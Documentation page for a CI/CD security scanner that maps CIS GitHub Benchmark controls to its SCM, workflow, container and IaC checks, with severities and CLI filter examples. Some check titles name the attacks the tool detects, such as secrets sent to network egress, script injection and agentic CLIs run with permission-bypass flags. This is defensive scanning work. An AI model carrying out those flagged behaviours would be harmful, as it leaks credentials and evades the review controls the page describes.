# CIS GitHub Benchmark

- **Version:** 1.1.0
- **URL:** <https://benchmarks.cisecurity.org/cis-benchmarks>
- **Source of truth:** `pipeline_check/core/standards/data/cis_github.py`

CIS GitHub Benchmark, platform-side posture for a single GitHub
organization or repository. Sections 1.1 (Code Changes), 1.4
(Third-Party), and 1.5 (Code Risks) are evidenced directly by the
`SCM-*` rule pack, which reads the GitHub REST API; a representative
slice of `GHA-*` workflow rules anchors 1.5.2 (CI/CD pipeline
instructions).

Use this page alongside the
[CIS Software Supply Chain Guide](cis_supply_chain.md) when a GitHub
audit asks for both the platform settings and the build-chain
posture. Pair with [OpenSSF Scorecard](openssf_scorecard.md) and
[SCM provider docs](../providers/scm.md) for the underlying signals.

## At a glance

- **Controls in this standard:** 28
- **Controls evidenced by at least one check:** 28 / 28
- **Distinct checks evidencing this standard:** 123
- **Of those, autofixable with `--fix`:** 15

_Severity levels (`CRITICAL` / `HIGH` / `MEDIUM` / `LOW` / `INFO`) follow the same scale across every provider and standard. See [How to read severity](README.md#how-to-read-severity) on the standards overview for the definitions._

## Coverage by control

Click a control ID to jump to the per-control section with the full check list. The severity mix column shows the spread of evidencing checks by severity (`C`ritical / `H`igh / `M`edium / `L`ow / `I`nfo).

| Control | Title | Checks | Severity mix |
|---------|-------|-------:|--------------|
| [`1.1.3`](#ctrl-1-1-3) | Ensure any change to code is approved by two strongly authenticated users | 5 | 3H · 2M |
| [`1.1.4`](#ctrl-1-1-4) | Ensure previous approvals are dismissed when updates are introduced | 3 | 3M |
| [`1.1.5`](#ctrl-1-1-5) | Ensure there are restrictions on who can dismiss code change reviews | 3 | 1H · 2M |
| [`1.1.6`](#ctrl-1-1-6) | Ensure code owners are set for extra sensitive code or configuration | 2 | 2M |
| [`1.1.7`](#ctrl-1-1-7) | Ensure code owner's review is required when a change affects owned code | 2 | 2M |
| [`1.1.9`](#ctrl-1-1-9) | Ensure all checks have passed before merging new code | 3 | 2M · 1L |
| [`1.1.10`](#ctrl-1-1-10) | Ensure open Git branches are up to date before they can be merged | 2 | 1M · 1L |
| [`1.1.11`](#ctrl-1-1-11) | Ensure all open comments are resolved before merging code | 1 | 1L |
| [`1.1.12`](#ctrl-1-1-12) | Ensure verification of signed commits for new changes | 5 | 1H · 4M |
| [`1.1.13`](#ctrl-1-1-13) | Ensure linear history is required | 2 | 1H · 1L |
| [`1.1.14`](#ctrl-1-1-14) | Ensure branch protection rules are enforced for administrators | 3 | 2H · 1M |
| [`1.1.15`](#ctrl-1-1-15) | Ensure pushing/merging on default branches is restricted | 4 | 1H · 2M · 1L |
| [`1.1.16`](#ctrl-1-1-16) | Ensure force push is denied | 3 | 2H · 1M |
| [`1.1.17`](#ctrl-1-1-17) | Ensure branch deletion is denied | 4 | 2H · 1M · 1L |
| [`1.1.18`](#ctrl-1-1-18) | Ensure any merging of code is automatically scanned for security | 6 | 3M · 3L |
| [`1.1.19`](#ctrl-1-1-19) | Ensure any merging of code is automatically scanned for vulnerabilities | 1 | 1M |
| [`1.1.20`](#ctrl-1-1-20) | Ensure any merging of code is automatically scanned for secrets | 2 | 2H |
| [`1.2.5`](#ctrl-1-2-5) | Ensure all copies (forks) of code are tracked and accounted for | 1 | 1M |
| [`1.2.6`](#ctrl-1-2-6) | Ensure all code projects are tracked for changes in dependents/dependencies | 2 | 1M · 1L |
| [`1.3.8`](#ctrl-1-3-8) | Ensure strict base permissions are set for repositories | 1 | 1H |
| [`1.3.10`](#ctrl-1-3-10) | Ensure SCM administrators control contribution access (deploy keys, write) | 2 | 2H |
| [`1.4.1`](#ctrl-1-4-1) | Ensure administrator approval is required for every installed application | 2 | 1H · 1M |
| [`1.4.3`](#ctrl-1-4-3) | Ensure the access granted to each installed application is limited | 2 | 1H · 1M |
| [`1.4.4`](#ctrl-1-4-4) | Ensure only secured webhooks are used | 1 | 1H |
| [`1.5.1`](#ctrl-1-5-1) | Ensure scanners are in place to identify and prevent sensitive data in code | 16 | 8C · 6H · 1M · 1L |
| [`1.5.2`](#ctrl-1-5-2) | Ensure scanners are in place to secure CI/CD pipeline instructions | 50 | 11C · 28H · 10M · 1L |
| [`1.5.3`](#ctrl-1-5-3) | Ensure scanners are in place to secure IaC instructions | 25 | 6C · 19H |
| [`1.5.4`](#ctrl-1-5-4) | Ensure scanners are in place to identify and confirm presence of vulnerabilities | 8 | 1H · 6M · 1L |

## Filter at runtime

Restrict a scan to checks that evidence this standard with `--standard cis_github`:

```bash
# All providers, only checks tied to this standard
pipeline_check --standard cis_github

# Compose with --pipeline to scope by provider
pipeline_check --pipeline github --standard cis_github

# Compose with another standard to widen the lens
pipeline_check --pipeline aws --standard cis_github --standard owasp_cicd_top_10
```

## Controls in scope

### 1.1.3: Ensure any change to code is approved by two strongly authenticated users { #ctrl-1-1-3 }

**Evidenced by 5 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-002`](#detail-scm-002) | Default branch protection does not require pull request reviews | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-011`](#detail-scm-011) | Default branch protection does not require CODEOWNERS reviews | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-014`](#detail-scm-014) | Default branch protection does not require approval of the most recent push | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-023`](#detail-scm-023) | Deployment environment lacks required-reviewer protection | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-032`](#detail-scm-032) | Active ruleset doesn't require a PR review (governance theater) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |

### 1.1.4: Ensure previous approvals are dismissed when updates are introduced { #ctrl-1-1-4 }

**Evidenced by 3 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-012`](#detail-scm-012) | Default branch protection keeps stale reviews after a push | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-014`](#detail-scm-014) | Default branch protection does not require approval of the most recent push | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-037`](#detail-scm-037) | Active ruleset's pull_request rule doesn't dismiss stale reviews | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.1.5: Ensure there are restrictions on who can dismiss code change reviews { #ctrl-1-1-5 }

**Evidenced by 3 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-018`](#detail-scm-018) | Required PR reviews can be bypassed by named identities | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-021`](#detail-scm-021) | Actions can approve pull requests (self-approval bypass) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-031`](#detail-scm-031) | Repo allows auto-merge (no human-timing gate) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.1.6: Ensure code owners are set for extra sensitive code or configuration { #ctrl-1-1-6 }

**Evidenced by 2 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-011`](#detail-scm-011) | Default branch protection does not require CODEOWNERS reviews | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-017`](#detail-scm-017) | Repository has no CODEOWNERS file | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.1.7: Ensure code owner's review is required when a change affects owned code { #ctrl-1-1-7 }

**Evidenced by 2 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-011`](#detail-scm-011) | Default branch protection does not require CODEOWNERS reviews | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-017`](#detail-scm-017) | Repository has no CODEOWNERS file | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.1.9: Ensure all checks have passed before merging new code { #ctrl-1-1-9 }

**Evidenced by 3 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-008`](#detail-scm-008) | Default branch protection does not require status checks | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-033`](#detail-scm-033) | Active ruleset doesn't require status checks | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-039`](#detail-scm-039) | Active ruleset doesn't pin a required workflow | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |

### 1.1.10: Ensure open Git branches are up to date before they can be merged { #ctrl-1-1-10 }

**Evidenced by 2 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-008`](#detail-scm-008) | Default branch protection does not require status checks | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-042`](#detail-scm-042) | Active ruleset doesn't require merge queue | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |

### 1.1.11: Ensure all open comments are resolved before merging code { #ctrl-1-1-11 }

**Evidenced by 1 check** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-013`](#detail-scm-013) | Default branch protection does not require conversation resolution | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |

### 1.1.12: Ensure verification of signed commits for new changes { #ctrl-1-1-12 }

**Evidenced by 5 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-006`](#detail-scm-006) | Default branch protection does not require signed commits | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-030`](#detail-scm-030) | Repository ruleset has bypass actor with bypass_mode: always | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-036`](#detail-scm-036) | Active ruleset doesn't require signed commits | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-043`](#detail-scm-043) | Tag-targeted ruleset doesn't require signed commits | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-044`](#detail-scm-044) | Default-branch signed-commits requirement bypassed for admins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.1.13: Ensure linear history is required { #ctrl-1-1-13 }

**Evidenced by 2 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-030`](#detail-scm-030) | Repository ruleset has bypass actor with bypass_mode: always | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-038`](#detail-scm-038) | Active ruleset doesn't require linear history | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |

### 1.1.14: Ensure branch protection rules are enforced for administrators { #ctrl-1-1-14 }

**Evidenced by 3 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-010`](#detail-scm-010) | Branch protection allows administrators to bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-030`](#detail-scm-030) | Repository ruleset has bypass actor with bypass_mode: always | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-044`](#detail-scm-044) | Default-branch signed-commits requirement bypassed for admins | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.1.15: Ensure pushing/merging on default branches is restricted { #ctrl-1-1-15 }

**Evidenced by 4 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-001`](#detail-scm-001) | Default branch has no protection rule | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-019`](#detail-scm-019) | Push restrictions allowlist names individual users | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-024`](#detail-scm-024) | Deployment environment can deploy from any branch | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-029`](#detail-scm-029) | Repository ruleset is in evaluate / disabled mode (not enforced) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.1.16: Ensure force push is denied { #ctrl-1-1-16 }

**Evidenced by 3 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-007`](#detail-scm-007) | Default branch protection allows force-pushes | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-030`](#detail-scm-030) | Repository ruleset has bypass actor with bypass_mode: always | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-034`](#detail-scm-034) | Active ruleset doesn't block force-push | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.1.17: Ensure branch deletion is denied { #ctrl-1-1-17 }

**Evidenced by 4 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-009`](#detail-scm-009) | Default branch protection allows branch deletion | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-030`](#detail-scm-030) | Repository ruleset has bypass actor with bypass_mode: always | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-035`](#detail-scm-035) | Active ruleset doesn't block branch deletion | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-043`](#detail-scm-043) | Tag-targeted ruleset doesn't require signed commits | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.1.18: Ensure any merging of code is automatically scanned for security { #ctrl-1-1-18 }

**Evidenced by 6 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-003`](#detail-scm-003) | GitHub default code scanning is not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-039`](#detail-scm-039) | Active ruleset doesn't pin a required workflow | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-040`](#detail-scm-040) | Active ruleset doesn't gate on code scanning results | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-045`](#detail-scm-045) | Default code scanning uses the limited query suite | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-046`](#detail-scm-046) | Default code scanning is configured but paused | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-047`](#detail-scm-047) | Repo language excluded from default code-scanning coverage | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.1.19: Ensure any merging of code is automatically scanned for vulnerabilities { #ctrl-1-1-19 }

**Evidenced by 1 check** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-005`](#detail-scm-005) | Dependabot security updates are not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.1.20: Ensure any merging of code is automatically scanned for secrets { #ctrl-1-1-20 }

**Evidenced by 2 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-004`](#detail-scm-004) | GitHub secret scanning is not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-015`](#detail-scm-015) | Secret scanning push protection is not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |

### 1.2.5: Ensure all copies (forks) of code are tracked and accounted for { #ctrl-1-2-5 }

**Evidenced by 1 check** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-028`](#detail-scm-028) | Private repo allows forking | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.2.6: Ensure all code projects are tracked for changes in dependents/dependencies { #ctrl-1-2-6 }

**Evidenced by 2 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-005`](#detail-scm-005) | Dependabot security updates are not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-016`](#detail-scm-016) | Private vulnerability reporting is not enabled | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |

### 1.3.8: Ensure strict base permissions are set for repositories { #ctrl-1-3-8 }

**Evidenced by 1 check** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-027`](#detail-scm-027) | Outside collaborator holds write / maintain / admin access | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |

### 1.3.10: Ensure SCM administrators control contribution access (deploy keys, write) { #ctrl-1-3-10 }

**Evidenced by 2 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-025`](#detail-scm-025) | Repo has write-enabled deploy keys (push backdoor) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-027`](#detail-scm-027) | Outside collaborator holds write / maintain / admin access | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |

### 1.4.1: Ensure administrator approval is required for every installed application { #ctrl-1-4-1 }

**Evidenced by 2 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-021`](#detail-scm-021) | Actions can approve pull requests (self-approval bypass) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-022`](#detail-scm-022) | Repo Actions permissions allow any source (no allow-list) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.4.3: Ensure the access granted to each installed application is limited { #ctrl-1-4-3 }

**Evidenced by 2 checks** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-020`](#detail-scm-020) | Default workflow GITHUB_TOKEN has write permission | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-022`](#detail-scm-022) | Repo Actions permissions allow any source (no allow-list) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### 1.4.4: Ensure only secured webhooks are used { #ctrl-1-4-4 }

**Evidenced by 1 check** across SCM.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`SCM-026`](#detail-scm-026) | Webhook ships events insecurely (HTTP / no-TLS / no-secret) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |

### 1.5.1: Ensure scanners are in place to identify and prevent sensitive data in code { #ctrl-1-5-1 }

**Evidenced by 16 checks** across 6 providers (CloudFormation, Dockerfile, GitHub Actions, Kubernetes, SCM, Terraform).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CF-002`](#detail-cf-002) | Stateful data-store resource carries a plaintext secret | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [CloudFormation](../providers/cloudformation.md) |  |
| [`DF-006`](#detail-df-006) | ENV or ARG carries a credential-shaped literal value | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-019`](#detail-df-019) | COPY/ADD source path looks like a credential file | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-020`](#detail-df-020) | ARG declares a credential-named build argument | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-005`](#detail-gha-005) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-033`](#detail-gha-033) | Secret value echoed / printed in a run: block | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-039`](#detail-gha-039) | services / container credentials embedded as literal in workflow | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-055`](#detail-gha-055) | Reusable workflow outputs derive a secret or caller-input value | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-057`](#detail-gha-057) | Secret-scanner output sent to network egress | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`K8S-017`](#detail-k8s-017) | Container env value carries a credential-shaped literal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-018`](#detail-k8s-018) | Secret stringData/data carries a credential-shaped literal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-037`](#detail-k8s-037) | ConfigMap data carries a credential-shaped literal | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`SCM-004`](#detail-scm-004) | GitHub secret scanning is not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-015`](#detail-scm-015) | Secret scanning push protection is not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-016`](#detail-scm-016) | Private vulnerability reporting is not enabled | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`TF-002`](#detail-tf-002) | Stateful data-store resource carries a plaintext secret | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Terraform](../providers/terraform.md) |  |

### 1.5.2: Ensure scanners are in place to secure CI/CD pipeline instructions { #ctrl-1-5-2 }

**Evidenced by 50 checks** across 6 providers (Argo Workflows, Buildkite, GitHub Actions, GitLab CI, SCM, Tekton).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`GHA-001`](#detail-gha-001) | Action not pinned to commit SHA | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-002`](#detail-gha-002) | pull_request_target checks out PR head | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-003`](#detail-gha-003) | Script injection via untrusted context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-004`](#detail-gha-004) | Workflow permissions block missing or overprovisioned | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-005`](#detail-gha-005) | AWS auth uses long-lived access keys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-019`](#detail-gha-019) | GITHUB_TOKEN written to persistent storage | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-030`](#detail-gha-030) | OIDC token requested without environment-protected job | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-031`](#detail-gha-031) | Workflow uses retired set-output / save-state command | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-032`](#detail-gha-032) | run: invokes local script on untrusted-trigger workflow | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-033`](#detail-gha-033) | Secret value echoed / printed in a run: block | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-034`](#detail-gha-034) | Reusable workflow called with secrets: inherit | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-035`](#detail-gha-035) | github-script step interpolates untrusted context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-036`](#detail-gha-036) | runs-on interpolates untrusted context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-037`](#detail-gha-037) | actions/checkout persists GITHUB_TOKEN into .git/config | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-038`](#detail-gha-038) | Workflow re-enables retired ::set-env / ::add-path commands | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-039`](#detail-gha-039) | services / container credentials embedded as literal in workflow | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-040`](#detail-gha-040) | Action reference matches a known-compromised SHA or tag | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-041`](#detail-gha-041) | Action upstream repo has a single contributor | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-042`](#detail-gha-042) | Action upstream repo is newly created | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-043`](#detail-gha-043) | Low-star action runs with sensitive permissions | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-044`](#detail-gha-044) | Build tool runs lifecycle scripts on untrusted-trigger workflow | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-045`](#detail-gha-045) | Caller-controlled ref input feeds actions/checkout | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-046`](#detail-gha-046) | Manual PR-head fetch on untrusted-trigger workflow | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-047`](#detail-gha-047) | Action ref resolves to a recently committed tag or SHA | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-048`](#detail-gha-048) | Workflow step writes a file under .github/workflows/ | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-049`](#detail-gha-049) | Workflow step makes a privileged git write (cross-repo or actions[bot] bypass) | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-050`](#detail-gha-050) | Publish step relies on long-lived registry token | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-051`](#detail-gha-051) | services / container image is not pinned by digest | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-052`](#detail-gha-052) | actions/cache key includes untrusted PR-controllable input | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-053`](#detail-gha-053) | if: predicate evaluates attacker-controllable context as expression | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-054`](#detail-gha-054) | actions/checkout with ssh-key persists SSH credential in repo | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-055`](#detail-gha-055) | Reusable workflow outputs derive a secret or caller-input value | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-056`](#detail-gha-056) | Workflow body contains a known supply-chain worm indicator | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-057`](#detail-gha-057) | Secret-scanner output sent to network egress | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-058`](#detail-gha-058) | Agentic CLI invoked with permission-bypass flags | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-059`](#detail-gha-059) | npm install without registry-signature verification step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-060`](#detail-gha-060) | pip install without `--require-hashes` verification | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
